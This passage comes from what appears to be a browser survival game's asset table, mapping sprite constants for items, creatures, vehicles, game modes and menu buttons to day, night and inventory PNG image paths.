                    INV_WOOD_DOOR_SPIKE_CLICK: "img/inv-wood-spike-door-click.png",
                    INV_STONE_DOOR_SPIKE_OUT: "img/inv-stone-spike-door-out.png",
                    INV_STONE_DOOR_SPIKE_IN: "img/inv-stone-spike-door-in.png",
                    INV_STONE_DOOR_SPIKE_CLICK: "img/inv-stone-spike-door-click.png",
                    INV_GOLD_DOOR_SPIKE_OUT: "img/inv-gold-spike-door-out.png",
                    INV_GOLD_DOOR_SPIKE_IN: "img/inv-gold-spike-door-in.png",
                    INV_GOLD_DOOR_SPIKE_CLICK: "img/inv-gold-spike-door-click.png",
                    INV_DIAMOND_DOOR_SPIKE_OUT: "img/inv-diamond-spike-door-out.png",
                    INV_DIAMOND_DOOR_SPIKE_IN: "img/inv-diamond-spike-door-in.png",
                    INV_DIAMOND_DOOR_SPIKE_CLICK: "img/inv-diamond-spike-door-click.png",
                    INV_AMETHYST_DOOR_SPIKE_OUT: "img/inv-amethyst-spike-door-out.png",
                    INV_AMETHYST_DOOR_SPIKE_IN: "img/inv-amethyst-spike-door-in.png",
                    INV_AMETHYST_DOOR_SPIKE_CLICK: "img/inv-amethyst-spike-door-click.png",
                    WOOD_DOOR_SPIKED: "img/day-wood-spike-door.png",
                    WOOD_DOOR_SPIKEN: "img/night-wood-spike-door.png",
                    STONE_DOOR_SPIKED: "img/day-stone-spike-door.png",
                    STONE_DOOR_SPIKEN: "img/night-stone-spike-door.png",
                    GOLD_DOOR_SPIKED: "img/day-gold-spike-door.png",
                    GOLD_DOOR_SPIKEN: "img/night-gold-spike-door.png",
                    DIAMOND_DOOR_SPIKED: "img/day-diamond-spike-door.png",
                    DIAMOND_DOOR_SPIKEN: "img/night-diamond-spike-door.png",
                    AMETHYST_DOOR_SPIKED: "img/day-amethyst-spike-door.png",
                    AMETHYST_DOOR_SPIKEN: "img/night-amethyst-spike-door.png",
                    INV_REIDITE_DOOR_SPIKE_OUT: "img/inv-reidite-spike-door-out.png",
                    INV_REIDITE_DOOR_SPIKE_IN: "img/inv-reidite-spike-door-in.png",
                    INV_REIDITE_DOOR_SPIKE_CLICK: "img/inv-reidite-spike-door-click.png",
                    INV_REIDITE_DOOR_OUT: "img/inv-reidite-door-out.png",
                    INV_REIDITE_DOOR_IN: "img/inv-reidite-door-in.png",
                    INV_REIDITE_DOOR_CLICK: "img/inv-reidite-door-click.png",
                    INV_REIDITE_SPIKE_OUT: "img/inv-reidite-spike-out.png",
                    INV_REIDITE_SPIKE_IN: "img/inv-reidite-spike-in.png",
                    INV_REIDITE_SPIKE_CLICK: "img/inv-reidite-spike-click.png",
                    INV_REIDITE_WALL_OUT: "img/inv-reidite-wall-out.png",
                    INV_REIDITE_WALL_IN: "img/inv-reidite-wall-in.png",
                    INV_REIDITE_WALL_CLICK: "img/inv-reidite-wall-click.png",
                    REIDITE_WALLD: "img/day-reidite-wall.png",
                    REIDITE_WALLN: "img/night-reidite-wall.png",
                    REIDITE_DOORD: "img/day-reidite-door.png",
                    REIDITE_DOORN: "img/night-reidite-door.png",
                    REIDITE_SPIKED: "img/day-reidite-spike.png",
                    REIDITE_SPIKEN: "img/night-reidite-spike.png",
                    REIDITE_DOOR_SPIKED: "img/day-reidite-spike-door.png",
                    REIDITE_DOOR_SPIKEN: "img/night-reidite-spike-door.png",
                    INV_PICK_REIDITE_OUT: "img/inv-reidite-pickaxe-out.png",
                    INV_PICK_REIDITE_IN: "img/inv-reidite-pickaxe-in.png",
                    INV_PICK_REIDITE_CLICK: "img/inv-reidite-pickaxe-click.png",
                    PICK_REIDITED: "img/day-reidite-pickaxe.png",
                    PICK_REIDITEN: "img/night-reidite-pickaxe.png",
                    INV_HAMMER_REIDITE_OUT: "img/inv-reidite-hammer-out.png",
                    INV_HAMMER_REIDITE_IN: "img/inv-reidite-hammer-in.png",
                    INV_HAMMER_REIDITE_CLICK: "img/inv-reidite-hammer-click.png",
                    HAMMER_REIDITED: "img/day-reidite-hammer.png",
                    HAMMER_REIDITEN: "img/night-reidite-hammer.png",
                    WATERMELOND: "img/day-watermelon1.png",
                    WATERMELONN: "img/night-watermelon1.png",
                    DRIED_WATERMELOND: "img/day-watermelon-dried1.png",
                    DRIED_WATERMELONN: "img/night-watermelon-dried1.png",
                    INV_WATERMELON_OUT: "img/inv-watermelon-out.png",
                    INV_WATERMELON_IN: "img/inv-watermelon-in.png",
                    INV_WATERMELON_CLICK: "img/inv-watermelon-click.png",
                    BOATD: "img/day-boat.png",
                    BOATN: "img/night-boat.png",
                    BOAT_WAVED: "img/day-boat-wave.png",
                    BOAT_WAVEN: "img/night-boat-wave.png",
                    INV_BOAT_OUT: "img/inv-boat-out.png",
                    INV_BOAT_IN: "img/inv-boat-in.png",
                    INV_BOAT_CLICK: "img/inv-boat-click.png",
                    PLANED: "img/day-plane.png",
                    PLANEN: "img/night-plane.png",
                    INV_PLANE_OUT: "img/inv-plane-out.png",
                    INV_PLANE_IN: "img/inv-plane-in.png",
                    INV_PLANE_CLICK: "img/inv-plane-click.png",
                    SLEDD: "img/day-sled.png",
                    SLEDN: "img/night-sled.png",
                    SLED_WAVED: "img/day-sled-wave.png",
                    SLED_WAVEN: "img/night-sled-wave.png",
                    INV_SLED_OUT: "img/inv-sled-out.png",
                    INV_SLED_IN: "img/inv-sled-in.png",
                    INV_SLED_CLICK: "img/inv-sled-click.png",
                    PIRATE_HATD: "img/day-pirate-hat.png",
                    PIRATE_HATN: "img/night-pirate-hat.png",
                    INV_PIRATE_HAT_OUT: "img/inv-pirate-hat-out.png",
                    INV_PIRATE_HAT_IN: "img/inv-pirate-hat-in.png",
                    INV_PIRATE_HAT_CLICK: "img/inv-pirate-hat-click.png",
                    PENGUIND: "img/day-penguin.png",
                    PENGUINN: "img/night-penguin.png",
                    HURT_PENGUIN: "img/hurt-penguin.png",
                    INV_PENGUIN_FEATHER: "img/inv-penguin-feather-click.png",
                    INV_HAWK_FEATHER: "img/inv-hawk-feather-click.png",
                    BOARD: "img/day-boar1.png",
                    BOAR_TAMEDD: "img/day-boar1-tamed.png",
                    BOAR_ANGRYD: "img/day-boar1-angry.png",
                    BOARN: "img/night-boar1.png",
                    BOAR_TAMEDN: "img/night-boar1-tamed.png",
                    BOAR_ANGRYN: "img/night-boar1-angry.png",
                    INV_MOUNT_BOAR_OUT: "img/inv-mount-boar-out.png",
                    INV_MOUNT_BOAR_IN: "img/inv-mount-boar-in.png",
                    INV_MOUNT_BOAR_CLICK: "img/inv-mount-boar-click.png",
                    HURT_BOAR: "img/day-hurt-boar1.png",
                    BOAR_STEP: "img/boar1-step.png",
                    SADDLED: "img/day-saddle1.png",
                    SADDLEN: "img/night-saddle1.png",
                    INV_SADDLE_OUT: "img/inv-saddle-out.png",
                    INV_SADDLE_IN: "img/inv-saddle-in.png",
                    INV_SADDLE_CLICK: "img/inv-saddle-click.png",
                    WAND1D: "img/day-magic-wand0.png",
                    WAND1N: "img/night-magic-wand0.png",
                    LIGHT_WAND1D: "img/day-light-wand1.png",
                    LIGHT_WAND1N: "img/night-light-wand1.png",
                    INV_WAND1_OUT: "img/inv-magic-wand0-out.png",
                    INV_WAND1_IN: "img/inv-magic-wand0-in.png",
                    INV_WAND1_CLICK: "img/inv-magic-wand0-click.png",
                    WAND2D: "img/day-magic-wand1.png",
                    WAND2N: "img/night-magic-wand1.png",
                    LIGHT_WAND0D: "img/day-light-wand0.png",
                    LIGHT_WAND0N: "img/night-light-wand0.png",
                    INV_WAND2_OUT: "img/inv-magic-wand1-out.png",
                    INV_WAND2_IN: "img/inv-magic-wand1-in.png",
                    INV_WAND2_CLICK: "img/inv-magic-wand1-click.png",
                    FIREFLYD: "img/day-firefly.png",
                    FIREFLYN: "img/night-firefly.png",
                    HURT_FIREFLY: "img/hurt-firefly.png",
                    INV_FIREFLY_OUT: "img/inv-firefly-out.png",
                    INV_FIREFLY_IN: "img/inv-firefly-in.png",
                    INV_FIREFLY_CLICK: "img/inv-firefly-click.png",
                    BABY_DRAGOND: "img/day-baby-dragon.png",
                    BABY_DRAGONN: "img/night-baby-dragon.png",
                    BABY_DRAGON_ATTACKD: "img/day-baby-dragon-angry.png",
                    BABY_DRAGON_ATTACKN: "img/night-baby-dragon-angry.png",
                    BABY_DRAGON_TAMEDD: "img/day-baby-dragon-tamed.png",
                    BABY_DRAGON_TAMEDN: "img/night-baby-dragon-tamed.png",
                    BABY_DRAGON_WING_LEFT_ATTACKD: "img/day-wing-dragon-left-angry.png",
                    BABY_DRAGON_WING_LEFT_ATTACKN: "img/night-dragon-wing-left-angry.png",
                    BABY_DRAGON_WING_RIGHT_ATTACKD: "img/day-wing-dragon-right-angry.png",
                    BABY_DRAGON_WING_RIGHT_ATTACKN: "img/night-dragon-wing-right-angry.png",
                    BABY_DRAGON_WING_LEFT_TAMEDD: "img/day-wing-dragon-left-tamed.png",
                    BABY_DRAGON_WING_LEFT_TAMEDN: "img/night-dragon-wing-left-tamed.png",
                    BABY_DRAGON_WING_RIGHT_TAMEDD: "img/day-wing-dragon-right-tamed.png",
                    BABY_DRAGON_WING_RIGHT_TAMEDN: "img/night-wing-dragon-right-tamed.png",
                    BABY_DRAGON_WING_LEFTD: "img/day-wing-dragon-left.png",
                    BABY_DRAGON_WING_LEFTN: "img/night-dragon-wing-left.png",
                    BABY_DRAGON_WING_RIGHTD: "img/day-wing-dragon-right.png",
                    BABY_DRAGON_WING_RIGHTN: "img/night-wing-dragon-right.png",
                    HURT_BABY_DRAGON: "img/hurt-baby-dragon.png",
                    HURT_BABY_DRAGON_WING_LEFT: "img/hurt-baby-dragon-wing-left.png",
                    HURT_BABY_DRAGON_WING_RIGHT: "img/hurt-baby-dragon-wing-right.png",
                    INV_BABY_DRAGON_OUT: "img/inv-baby-dragon-out.png",
                    INV_BABY_DRAGON_IN: "img/inv-baby-dragon-in.png",
                    INV_BABY_DRAGON_CLICK: "img/inv-baby-dragon-click.png",
                    BABY_LAVAD: "img/day-baby-lava.png",
                    BABY_LAVAN: "img/night-baby-lava.png",
                    BABY_LAVA_ATTACKD: "img/day-baby-lava-angry.png",
                    BABY_LAVA_ATTACKN: "img/night-baby-lava-angry.png",
                    BABY_LAVA_TAMEDD: "img/day-baby-lava-tamed.png",
                    BABY_LAVA_TAMEDN: "img/night-baby-lava-tamed.png",
                    BABY_LAVA_WING_LEFT_ATTACKD: "img/day-wing-lava-left-angry.png",
                    BABY_LAVA_WING_LEFT_ATTACKN: "img/night-wing-lava-left-angry.png",
                    BABY_LAVA_WING_RIGHT_ATTACKD: "img/day-wing-lava-right-angry.png",
                    BABY_LAVA_WING_RIGHT_ATTACKN: "img/night-wing-lava-right-angry.png",
                    BABY_LAVA_WING_LEFT_TAMEDD: "img/day-wing-lava-left-tamed.png",
                    BABY_LAVA_WING_LEFT_TAMEDN: "img/night-wing-lava-left-tamed.png",
                    BABY_LAVA_WING_RIGHT_TAMEDD: "img/day-wing-lava-right-tamed.png",
                    BABY_LAVA_WING_RIGHT_TAMEDN: "img/night-wing-lava-right-tamed.png",
                    BABY_LAVA_WING_LEFTD: "img/day-wing-lava-left.png",
                    BABY_LAVA_WING_LEFTN: "img/night-wing-lava-left.png",
                    BABY_LAVA_WING_RIGHTD: "img/day-wing-lava-right.png",
                    BABY_LAVA_WING_RIGHTN: "img/night-wing-lava-right.png",
                    HURT_BABY_LAVA: "img/hurt-baby-lava.png",
                    HURT_BABY_LAVA_WING_LEFT: "img/hurt-baby-lava-wing-left.png",
                    HURT_BABY_LAVA_WING_RIGHT: "img/hurt-baby-lava-wing-right.png",
                    INV_BABY_LAVA_OUT: "img/inv-baby-lava-out.png",
                    INV_BABY_LAVA_IN: "img/inv-baby-lava-in.png",
                    INV_BABY_LAVA_CLICK: "img/inv-baby-lava-click.png",
                    HAWKD: "img/day-falcon.png",
                    HAWKN: "img/night-falcon.png",
                    HAWK_ATTACKD: "img/day-falcon-angry.png",
                    HAWK_ATTACKN: "img/night-falcon-angry.png",
                    HAWK_GROUNDD: "img/day-falcon-ground.png",
                    HAWK_GROUNDN: "img/night-falcon-ground.png",
                    HAWK_GROUND_ATTACKD: "img/day-falcon-ground-angry.png",
                    HAWK_GROUND_ATTACKN: "img/night-falcon-ground-angry.png",
                    HAWK_WING_LEFTD: "img/day-falcon-wings-left.png",
                    HAWK_WING_LEFTN: "img/night-falcon-wings-left.png",
                    HAWK_WING_RIGHTD: "img/day-falcon-wings-right.png",
                    HAWK_WING_RIGHTN: "img/night-falcon-wings-right.png",
                    HAWK_WING_LEFT_ATTACKD: "img/day-falcon-angry-wings-left.png",
                    HAWK_WING_LEFT_ATTACKN: "img/night-falcon-angry-wings-left.png",
                    HAWK_WING_RIGHT_ATTACKD: "img/day-falcon-angry-wings-right.png",
                    HAWK_WING_RIGHT_ATTACKN: "img/night-falcon-angry-wings-right.png",
                    HAWK_WING_LEFT_TAMEDD: "img/day-falcon-wings-left-tamed.png",
                    HAWK_WING_LEFT_TAMEDN: "img/night-falcon-wings-left-tamed.png",
                    HAWK_WING_RIGHT_TAMEDD: "img/day-falcon-wings-right-tamed.png",
                    HAWK_WING_RIGHT_TAMEDN: "img/night-falcon-wings-right-tamed.png",
                    HAWK_TAMEDD: "img/day-falcon-tamed.png",
                    HAWK_TAMEDN: "img/night-falcon-tamed.png",
                    HURT_HAWK_GROUND: "img/hurt-falcon-ground.png",
                    HURT_HAWK: "img/hurt-falcon.png",
                    HURT_HAWK_WING_LEFT: "img/hurt-falcon-wings-left.png",
                    HURT_HAWK_WING_RIGHT: "img/hurt-falcon-wings-right.png",
                    INV_HAWK_OUT: "img/inv-falcon-out.png",
                    INV_HAWK_IN: "img/inv-falcon-in.png",
                    INV_HAWK_CLICK: "img/inv-falcon-click.png",
                    CRAB_BOSSD: "img/day-crab-boss.png",
                    CRAB_BOSSN: "img/night-crab-boss.png",
                    CRAB_BOSS_ATTACKD: "img/day-crab-boss-angry.png",
                    CRAB_BOSS_ATTACKN: "img/night-crab-boss-angry.png",
                    CRAB_BOSS_TAMEDD: "img/day-crab-boss-tamed.png",
                    CRAB_BOSS_TAMEDN: "img/night-crab-boss-tamed.png",
                    CRAB_BOSS_CLAW_LEFT_ATTACKD: "img/day-crab-boss-claw-left-attack.png",
                    CRAB_BOSS_CLAW_LEFT_ATTACKN: "img/night-crab-boss-claw-left-attack.png",
                    CRAB_BOSS_CLAW_RIGHT_ATTACKD: "img/day-crab-boss-claw-right-attack.png",
                    CRAB_BOSS_CLAW_RIGHT_ATTACKN: "img/night-crab-boss-claw-right-attack.png",
                    CRAB_BOSS_CLAW_LEFT_TAMEDD: "img/day-crab-boss-claw-left-tamed.png",
                    CRAB_BOSS_CLAW_LEFT_TAMEDN: "img/night-crab-boss-claw-left-tamed.png",
                    CRAB_BOSS_CLAW_RIGHT_TAMEDD: "img/day-crab-boss-claw-right-tamed.png",
                    CRAB_BOSS_CLAW_RIGHT_TAMEDN: "img/night-crab-boss-claw-right-tamed.png",
                    CRAB_BOSS_CLAW_LEFTD: "img/day-crab-boss-claw-left.png",
                    CRAB_BOSS_CLAW_LEFTN: "img/night-crab-boss-claw-left.png",
                    CRAB_BOSS_CLAW_RIGHTD: "img/day-crab-boss-claw-right.png",
                    CRAB_BOSS_CLAW_RIGHTN: "img/night-crab-boss-claw-right.png",
                    HURT_CRAB_BOSS: "img/hurt-crab-boss.png",
                    HURT_CRAB_BOSS_CLAW_LEFT: "img/hurt-crab-boss-claw-left.png",
                    HURT_CRAB_BOSS_CLAW_RIGHT: "img/hurt-crab-boss-claw-right.png",
                    HEAL_CRAB_BOSS: "img/heal-crab-boss.png",
                    HEAL_CRAB_BOSS_CLAW_LEFT: "img/heal-crab-boss-claw-left.png",
                    HEAL_CRAB_BOSS_CLAW_RIGHT: "img/heal-crab-boss-claw-right.png",
                    CRAB_STEP: "img/crab-step.png",
                    INV_CRAB_BOSS_OUT: "img/inv-crab-boss-out.png",
                    INV_CRAB_BOSS_IN: "img/inv-crab-boss-in.png",
                    INV_CRAB_BOSS_CLICK: "img/inv-crab-boss-click.png",
                    CACTUSD: "img/day-cactus10.png",
                    CACTUSN: "img/night-cactus10.png",
                    INV_CACTUS_OUT: "img/inv-cactus-out.png",
                    INV_CACTUS_IN: "img/inv-cactus-in.png",
                    INV_CACTUS_CLICK: "img/inv-cactus-click.png",
                    SCORPIOND: "img/day-scorpion.png",
                    SCORPIONN: "img/night-scorpion.png",
                    SCORPION_HAND_LEFTD: "img/day-scorpion-hand-left.png",
                    SCORPION_HAND_LEFTN: "img/night-scorpion-hand-left.png",
                    SCORPION_HAND_RIGHTD: "img/day-scorpion-hand-right.png",
                    SCORPION_HAND_RIGHTN: "img/night-scorpion-hand-right.png",
                    HURT_SCORPION: "img/hurt-scorpion.png",
                    HURT_SCORPION_HAND_LEFT: "img/hurt-scorpion-hand-left.png",
                    HURT_SCORPION_HAND_RIGHT: "img/hurt-scorpion-hand-right.png",
                    VULTURED: "img/day-vulture.png",
                    VULTUREN: "img/night-vulture.png",
                    VULTURE_ATTACKD: "img/day-vulture-angry.png",
                    VULTURE_ATTACKN: "img/night-vulture-angry.png",
                    VULTURE_GROUNDD: "img/day-vulture-ground.png",
                    VULTURE_GROUNDN: "img/night-vulture-ground.png",
                    VULTURE_GROUND_ATTACKD: "img/day-vulture-ground-angry.png",
                    VULTURE_GROUND_ATTACKN: "img/night-vulture-ground-angry.png",
                    VULTURE_WING_LEFTD: "img/day-vulture-wings-left.png",
                    VULTURE_WING_LEFTN: "img/night-vulture-wings-left.png",
                    VULTURE_WING_RIGHTD: "img/day-vulture-wings-right.png",
                    VULTURE_WING_RIGHTN: "img/night-vulture-wings-right.png",
                    VULTURE_WING_LEFT_ATTACKD: "img/day-vulture-angry-wings-left.png",
                    VULTURE_WING_LEFT_ATTACKN: "img/night-vulture-angry-wings-left.png",
                    VULTURE_WING_RIGHT_ATTACKD: "img/day-vulture-angry-wings-right.png",
                    VULTURE_WING_RIGHT_ATTACKN: "img/night-vulture-angry-wings-right.png",
                    VULTURE_WING_LEFT_TAMEDD: "img/day-vulture-wings-left-tamed.png",
                    VULTURE_WING_LEFT_TAMEDN: "img/night-vulture-wings-left-tamed.png",
                    VULTURE_WING_RIGHT_TAMEDD: "img/day-vulture-wings-right-tamed.png",
                    VULTURE_WING_RIGHT_TAMEDN: "img/night-vulture-wings-right-tamed.png",
                    VULTURE_TAMEDD: "img/day-vulture-tamed.png",
                    VULTURE_TAMEDN: "img/night-vulture-tamed.png",
                    HURT_VULTURE_GROUND: "img/hurt-vulture-ground.png",
                    HURT_VULTURE: "img/hurt-vulture.png",
                    HURT_VULTURE_WING_LEFT: "img/hurt-vulture-wings-left.png",
                    HURT_VULTURE_WING_RIGHT: "img/hurt-vulture-wings-right.png",
                    ALOE_VERAD: "img/day-aloe-vera.png",
                    ALOE_VERAN: "img/night-aloe-vera.png",
                    INV_ALOE_VERA_OUT: "img/inv-aloe-vera-out.png",
                    INV_ALOE_VERA_IN: "img/inv-aloe-vera-in.png",
                    INV_ALOE_VERA_CLICK: "img/inv-aloe-vera-click.png",
                    ALOE_VERA_GROWND: "img/day-aloe-vera-grown.png",
                    ALOE_VERA_GROWNN: "img/night-aloe-vera-grown.png",
                    ALOE_VERA_DRIEDD: "img/day-aloe-vera-dried.png",
                    ALOE_VERAN_DRIEDN: "img/night-aloe-vera-dried.png",
                    TURBAN1D: "img/day-turban1.png",
                    TURBAN1N: "img/night-turban1.png",
                    TURBAN2D: "img/day-turban2.png",
                    TURBAN2N: "img/night-turban2.png",
                    INV_TURBAN2_OUT: "img/inv-turban2-out.png",
                    INV_TURBAN2_IN: "img/inv-turban2-in.png",
                    INV_TURBAN2_CLICK: "img/inv-turban2-click.png",
                    INV_TURBAN1_OUT: "img/inv-turban1-out.png",
                    INV_TURBAN1_IN: "img/inv-turban1-in.png",
                    INV_TURBAN1_CLICK: "img/inv-turban1-click.png",
                    PITCHFORK2D: "img/day-pitchfork2.png",
                    PITCHFORK2N: "img/night-pitchfork2.png",
                    INV_PITCHFORK2_OUT: "img/inv-pitchfork2-out.png",
                    INV_PITCHFORK2_IN: "img/inv-pitchfork2-in.png",
                    INV_PITCHFORK2_CLICK: "img/inv-pitchfork2-click.png",
                    INV_PITCHFORK_PART_CLICK: "img/inv-gold-fork-click.png",
                    INV_PILOT_GLASSES_CLICK: "img/inv-pilot-glasses-click.png",
                    PILOT_HELMETD: "img/day-pilot-helmet.png",
                    PILOT_HELMETN: "img/night-pilot-helmet.png",
                    INV_PILOT_HELMET_OUT: "img/inv-pilot-helmet-out.png",
                    INV_PILOT_HELMET_IN: "img/inv-pilot-helmet-in.png",
                    INV_PILOT_HELMET_CLICK: "img/inv-pilot-helmet-click.png",
                    SAND_WORM0D: "img/day-sandworm0.png",
                    SAND_WORM1D: "img/day-sandworm1.png",
                    SAND_WORM2D: "img/day-sandworm2.png",
                    SAND_WORM0N: "img/night-sandworm0.png",
                    SAND_WORM1N: "img/night-sandworm1.png",
                    SAND_WORM2N: "img/night-sandworm2.png",
                    HURT_SAND_WORM0: "img/hurt-sandworm0.png",
                    HURT_SAND_WORM1: "img/hurt-sandworm1.png",
                    HURT_SAND_WORM2: "img/hurt-sandworm2.png",
                    INV_VULTURE_FEATHER: "img/inv-vulture-feather-click.png",
                    EMERALD0D: "img/day-emerald0.png",
                    EMERALD0N: "img/night-emerald0.png",
                    EMERALD1D: "img/day-emerald1.png",
                    EMERALD1N: "img/night-emerald1.png",
                    EMERALD2D: "img/day-emerald2.png",
                    EMERALD2N: "img/night-emerald2.png",
                    INV_EMERALD: "img/inv-emerald-click.png",
                    INV_SANDWORM_JUICE_OUT: "img/inv-sworm-juice-out.png",
                    INV_SANDWORM_JUICE_IN: "img/inv-sworm-juice-in.png",
                    INV_SANDWORM_JUICE_CLICK: "img/inv-sworm-juice-click.png",
                    EMERALD_MACHINED: "img/day-point-machine.png",
                    EMERALD_MACHINEN: "img/night-point-machine.png",
                    EMERALD_MACHINE_HOLED: "img/day-point-machine-hole.png",
                    EMERALD_MACHINE_HOLEN: "img/night-point-machine-hole.png",
                    EMERALD_MACHINE_GROUNDD: "img/day-point-machine-ground.png",
                    EMERALD_MACHINE_GROUNDN: "img/night-point-machine-ground.png",
                    EMERALD_MACHINE_ROTATED: "img/day-point-machine-rotate.png",
                    EMERALD_MACHINE_ROTATEN: "img/night-point-machine-rotate.png",
                    INV_EMERALD_MACHINE_OUT: "img/inv-point-machine-out.png",
                    INV_EMERALD_MACHINE_IN: "img/inv-point-machine-in.png",
                    INV_EMERALD_MACHINE_CLICK: "img/inv-point-machine-click.png",
                    EXTRACTOR_MACHINE0_STONED: "img/day-extractor-machine0-stone.png",
                    EXTRACTOR_MACHINE0_STONEN: "img/night-extractor-machine0-stone.png",
                    EXTRACTOR_MACHINE_STONED: "img/day-extractor-machine-stone.png",
                    EXTRACTOR_MACHINE_STONEN: "img/night-extractor-machine-stone.png",
                    INV_EXTRACTOR_MACHINE_STONE_OUT: "img/inv-extractor-machine-stone-out.png",
                    INV_EXTRACTOR_MACHINE_STONE_IN: "img/inv-extractor-machine-stone-in.png",
                    INV_EXTRACTOR_MACHINE_STONE_CLICK: "img/inv-extractor-machine-stone-click.png",
                    EXTRACTOR_MACHINE0_GOLDD: "img/day-extractor-machine0-gold.png",
                    EXTRACTOR_MACHINE0_GOLDN: "img/night-extractor-machine0-gold.png",
                    EXTRACTOR_MACHINE_GOLDD: "img/day-extractor-machine-gold.png",
                    EXTRACTOR_MACHINE_GOLDN: "img/night-extractor-machine-gold.png",
                    INV_EXTRACTOR_MACHINE_GOLD_OUT: "img/inv-extractor-machine-gold-out.png",
                    INV_EXTRACTOR_MACHINE_GOLD_IN: "img/inv-extractor-machine-gold-in.png",
                    INV_EXTRACTOR_MACHINE_GOLD_CLICK: "img/inv-extractor-machine-gold-click.png",
                    EXTRACTOR_MACHINE0_DIAMONDD: "img/day-extractor-machine0-diamond.png",
                    EXTRACTOR_MACHINE0_DIAMONDN: "img/night-extractor-machine0-diamond.png",
                    EXTRACTOR_MACHINE_DIAMONDD: "img/day-extractor-machine-diamond.png",
                    EXTRACTOR_MACHINE_DIAMONDN: "img/night-extractor-machine-diamond.png",
                    INV_EXTRACTOR_MACHINE_DIAMOND_OUT: "img/inv-extractor-machine-diamond-out.png",
                    INV_EXTRACTOR_MACHINE_DIAMOND_IN: "img/inv-extractor-machine-diamond-in.png",
                    INV_EXTRACTOR_MACHINE_DIAMOND_CLICK: "img/inv-extractor-machine-diamond-click.png",
                    EXTRACTOR_MACHINE0_AMETHYSTD: "img/day-extractor-machine0-amethyst.png",
                    EXTRACTOR_MACHINE0_AMETHYSTN: "img/night-extractor-machine0-amethyst.png",
                    EXTRACTOR_MACHINE_AMETHYSTD: "img/day-extractor-machine-amethyst.png",
                    EXTRACTOR_MACHINE_AMETHYSTN: "img/night-extractor-machine-amethyst.png",
                    INV_EXTRACTOR_MACHINE_AMETHYST_OUT: "img/inv-extractor-machine-amethyst-out.png",
                    INV_EXTRACTOR_MACHINE_AMETHYST_IN: "img/inv-extractor-machine-amethyst-in.png",
                    INV_EXTRACTOR_MACHINE_AMETHYST_CLICK: "img/inv-extractor-machine-amethyst-click.png",
                    EXTRACTOR_MACHINE0_REIDITED: "img/day-extractor-machine0-reidite.png",
                    EXTRACTOR_MACHINE0_REIDITEN: "img/night-extractor-machine0-reidite.png",
                    EXTRACTOR_MACHINE_REIDITED: "img/day-extractor-machine-reidite.png",
                    EXTRACTOR_MACHINE_REIDITEN: "img/night-extractor-machine-reidite.png",
                    INV_EXTRACTOR_MACHINE_REIDITE_OUT: "img/inv-extractor-machine-reidite-out.png",
                    INV_EXTRACTOR_MACHINE_REIDITE_IN: "img/inv-extractor-machine-reidite-in.png",
                    INV_EXTRACTOR_MACHINE_REIDITE_CLICK: "img/inv-extractor-machine-reidite-click.png",
                    EXTRACTOR_CASES: "img/extractor-cases.png",
                    HEND: "img/day-golden-hen.png",
                    HENN: "img/night-golden-hen.png",
                    CHICKEND: "img/day-golden-chicken.png",
                    CHICKENN: "img/night-golden-chicken.png",
                    HURT_GOLDEN_HEN: "img/hurt-golden-hen.png",
                    HURT_GOLDEN_CHICKEN: "img/hurt-golden-chicken.png",
                    LOGO_INTERFACE: "img/logo-interface.png",
                    FOREST_MODE_HOVER: "img/forest-mode-hover.png",
                    NORMAL_MODE_HOVER: "img/normal-mode-hover.png",
                    VAMPIRE_MODE_HOVER: "img/vampire-mode-hover.png",
                    ZOMBIE_MODE_HOVER: "img/zombie-mode-hover.png",
                    MODE_COMMUNITY_HOVER: "img/community-mode-hover2.png",
                    MODE_EXPERIMENTAL_HOVER: "img/experimental-mode-hover.png",
                    ZOMBIE_MODE_OUT: "img/zombie-mode-out.png",
                    ZOMBIE_MODE_IN: "img/zombie-mode-in.png",
                    ZOMBIE_MODE_CLICK: "img/zombie-mode-click.png",
                    VAMPIRE_MODE_OUT: "img/vampire-mode-out.png",
                    VAMPIRE_MODE_IN: "img/vampire-mode-in.png",
                    VAMPIRE_MODE_CLICK: "img/vampire-mode-click.png",
                    NORMAL_MODE_OUT: "img/normal-mode-out.png",
                    NORMAL_MODE_IN: "img/normal-mode-in.png",
                    NORMAL_MODE_CLICK: "img/normal-mode-click.png",
                    FOREST_MODE_OUT: "img/forest-mode-out.png",
                    FOREST_MODE_IN: "img/forest-mode-in.png",
                    FOREST_MODE_CLICK: "img/forest-mode-click.png",
                    MODE_COMMUNITY_OUT: "img/community-mode-out.png",
                    MODE_COMMUNITY_IN: "img/community-mode-in.png",
                    MODE_COMMUNITY_CLICK: "img/community-mode-click.png",
                    MODE_EXPERIMENTAL_OUT: "img/experimental-modes-out.png",
                    MODE_EXPERIMENTAL_IN: "img/experimental-modes-in.png",
                    MODE_EXPERIMENTAL_CLICK: "img/experimental-modes-click.png",
                    YOUTUBE_BUTTON_OUT: "img/youtube-button-out.png",
                    YOUTUBE_BUTTON_IN: "img/youtube-button-in.png",
                    YOUTUBE_BUTTON_CLICK: "img/youtube-button-click.png",
                    WIKI_BUTTON_OUT: "img/wiki-button-out.png",
                    WIKI_BUTTON_IN: "img/wiki-button-in.png",
                    WIKI_BUTTON_CLICK: "img/wiki-button-click.png",
                    TWITTER_BUTTON_OUT: "img/twitter-button-out.png",
                    TWITTER_BUTTON_IN: "img/twitter-button-in.png",
                    TWITTER_BUTTON_CLICK: "img/twitter-button-click.png",
                    FACEBOOK_BUTTON_OUT: "img/facebook-button-out.png",
                    FACEBOOK_BUTTON_IN: "img/facebook-button-in.png",
                    FACEBOOK_BUTTON_CLICK: "img/facebook-button-click.png",
                    REDDIT_BUTTON_OUT: "img/reddit-button-out.png",
                    REDDIT_BUTTON_IN: "img/reddit-button-in.png",
                    REDDIT_BUTTON_CLICK: "img/reddit-button-click.png",
                    DISCORD_BUTTON_OUT: "img/discord-button-out.png",
                    DISCORD_BUTTON_IN: "img/discord-button-in.png",
                    DISCORD_BUTTON_CLICK: "img/discord-button-click.png",
                    TERMINAL_BUTTON_OUT: "img/terminal-button-out.png",
                    TERMINAL_BUTTON_IN: "img/terminal-button-in.png",
                    TERMINAL_BUTTON_CLICK: "img/terminal-button-click.png",
                    RESTART_OUT: "img/restart-out.png",
                    RESTART_IN: "img/restart-in.png",
                    RESTART_CLICK: "img/restart-click.png",
                    GUIDE_OUT: "img/guide-out.png",
                    GUIDE_IN: "img/guide-in.png",
                    GUIDE_CLICK: "img/guide-click.png",
                    COPY_PASTE_OUT: "img/copy-paste-out.png",
                    COPY_PASTE_IN: "img/copy-paste-in.png",
                    COPY_PASTE_CLICK: "img/copy-paste-click.png",
                    LINKS_BG: "img/link-buttons-bg.png",
                    CHANGELOG_BOX: "img/changelog-box2.png",
